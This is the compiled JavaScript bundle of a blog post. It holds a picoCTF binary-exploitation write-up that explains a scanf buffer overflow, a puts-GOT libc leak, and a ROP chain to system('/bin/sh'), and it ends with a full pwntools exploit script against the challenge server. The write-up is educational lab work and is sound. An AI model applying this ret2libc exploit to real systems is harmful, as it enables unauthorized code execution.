"use strict";(self.webpackChunkchristopher_nguyen_re=self.webpackChunkchristopher_nguyen_re||[]).push([[3057],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>h});var r=n(7294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var s=r.createContext({}),c=function(e){var t=r.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},p=function(e){var t=c(e.components);return r.createElement(s.Provider,{value:t},e.children)},d={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},u=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,s=e.parentName,p=l(e,["components","mdxType","originalType","parentName"]),u=c(n),h=a,f=u["".concat(s,".").concat(h)]||u[h]||d[h]||o;return n?r.createElement(f,i(i({ref:t},p),{},{components:n})):r.createElement(f,i({ref:t},p))}));function h(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,i=new Array(o);i[0]=u;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l.mdxType="string"==typeof e?e:a,i[1]=l;for(var c=2;c<o;c++)i[c]=n[c];return r.createElement.apply(null,i)}return r.createElement.apply(null,n)}u.displayName="MDXCreateElement"},7364:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>s,contentTitle:()=>i,default:()=>d,frontMatter:()=>o,metadata:()=>l,toc:()=>c});var r=n(7462),a=(n(7294),n(3905));const o={slug:"heres_a_libc",title:"Here's a LIBC",authors:["nguyen"],tags:["Pico CTF","Binary Exploitation"]},i=void 0,l={permalink:"/blog/heres_a_libc",editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2022-12-27-heres-a-libc.md",source:"@site/blog/2022-12-27-heres-a-libc.md",title:"Here's a LIBC",description:"The Challenge",date:"2022-12-27T00:00:00.000Z",formattedDate:"December 27, 2022",tags:[{label:"Pico CTF",permalink:"/blog/tags/pico-ctf"},{label:"Binary Exploitation",permalink:"/blog/tags/binary-exploitation"}],readingTime:1.98,truncated:!0,authors:[{name:"Christopher Nguyen",title:"Reverse Engineer",url:"https://github.com/christopher-nguyen-re",imageURL:"https://cdn.cnn.com/cnnnext/dam/assets/190517103414-01-grumpy-cat-file-restricted.jpg",key:"nguyen"}],frontMatter:{slug:"heres_a_libc",title:"Here's a LIBC",authors:["nguyen"],tags:["Pico CTF","Binary Exploitation"]},nextItem:{title:"Guessing Game 1",permalink:"/blog/guessing_game_1"}},s={authorsImageUrls:[void 0]},c=[{value:"The Challenge",id:"the-challenge",level:2},{value:"Analysis",id:"analysis",level:2},{value:"The Solve",id:"the-solve",level:2},{value:"Script",id:"script",level:2}],p={toc:c};function d(e){let{components:t,...n}=e;return(0,a.kt)("wrapper",(0,r.Z)({},p,n,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h2",{id:"the-challenge"},"The Challenge"),(0,a.kt)("p",null,"The challenge can be found ",(0,a.kt)("a",{parentName:"p",href:"https://play.picoctf.org/practice"},"here"),"."),(0,a.kt)("h2",{id:"analysis"},"Analysis"),(0,a.kt)("p",null,"I always like to start off with running checksec on the binary of interest."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"checksec ./vuln\n")),(0,a.kt)("p",null,"Insert image of checksec result here."),(0,a.kt)("p",null,"We won't be able to execute instructions on the stack so a ropchain may be necessary. PIE is not enabled so we will not need to worry about memory addresses changing every time we run the binary."),(0,a.kt)("p",null,"Using Ghidra, we find that there is a ",(0,a.kt)("inlineCode",{parentName:"p"},"scanf")," vulnerability that can lead to a buffer overflow. We can use ",(0,a.kt)("inlineCode",{parentName:"p"},"cyclic")," to determine the overflow offset which is 136."),(0,a.kt)("h2",{id:"the-solve"},"The Solve"),(0,a.kt)("p",null,"There is no flag within the binary so we will try to obtain a shell. If we leak a libc address, we can find the base address of the library and then utilize the system function to start a shell."),(0,a.kt)("p",null,"A common technique here is to use ",(0,a.kt)("inlineCode",{parentName:"p"},"puts")," to leak the ",(0,a.kt)("inlineCode",{parentName:"p"},"puts")," GOT. With the ",(0,a.kt)("inlineCode",{parentName:"p"},"puts")," address, we can determine the address for system and craft a ropchain to run ",(0,a.kt)("inlineCode",{parentName:"p"},'system("bin/sh")'),". Due to stack alignment, I needed an extra ",(0,a.kt)("inlineCode",{parentName:"p"},"ret")," instruction."),(0,a.kt)("p",null,"Now we have a shell and can see that there is a flag file that we can ",(0,a.kt)("inlineCode",{parentName:"p"},"cat"),"."),(0,a.kt)("h2",{id:"script"},"Script"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-python"},"from pwn import *\n\nexe = ELF(\"./vuln_patched\")\nlibc = ELF(\"./libc.so.6\")\nld = ELF(\"./ld-2.27.so\")\n\ncontext.binary = exe\ncontext.log_level = 'info'\ncontext.terminal = ['gnome-terminal', '-e']\n\ngdb_script = \"\"\"\n\"\"\"\n\ndef conn():\n    '''Establish the connection to the process, local or remote.\n    '''\n\n    if args.get('REMOTE'):\n        io = remote('mercury.picoctf.net', 24159)\n    elif args.get('GDB'):\n        io = gdb.debug([exe.path], gdb_script)\n    else:\n        io = process([exe.path])\n    return io\n\n\ndef main():\n    '''Return the flag.\n    '''\n    offset = 136\n\n    rop = ROP(exe)\n    with conn() as io:\n        pattern = b\"A\" * offset + p64(rop.find_gadget(['pop rdi', 'ret'])[0]) + \\\n                    p64(exe.got['puts']) + p64(exe.plt['puts']) + p64(exe.symbols['main'])\n        io.sendline(pattern)\n        io.recvlines(2)\n        # Get the puts output of the puts GOT address\n        got_addr = io.recvline()\n        # Strip newline\n        got_addr = got_addr[:-1]\n        \n        # Pad for packing\n        pad_len = 8 - len(got_addr)\n        got_addr = got_addr + (b\"\\x00\" * pad_len)\n\n        print(f\"GOT ADDR: {hex(u64(got_addr))}\")\n        base_addr = u64(got_addr) - 0x180a30\n        print(f\"Base addr: {hex(base_addr)}\")\n        system_addr = base_addr + 0x0014f4e0\n        print(f\"System addr: {hex(system_addr)}\")\n        bin_sh_addr = base_addr + 0x2b40fa\n        \n        # Note stack alignment issues so additional ret was required for 16 byte alignment\n        payload = b\"A\" * offset + p64(rop.find_gadget(['pop rdi', 'ret'])[0]) + \\\n                    p64(bin_sh_addr) + p64(rop.find_gadget(['ret'])[0]) + \\\n                    p64(system_addr)\n        io.sendline(payload)\n        io.interactive()\n\n\nif __name__ == '__main__':\n    main()\n")))}d.isMDXComponent=!0}}]);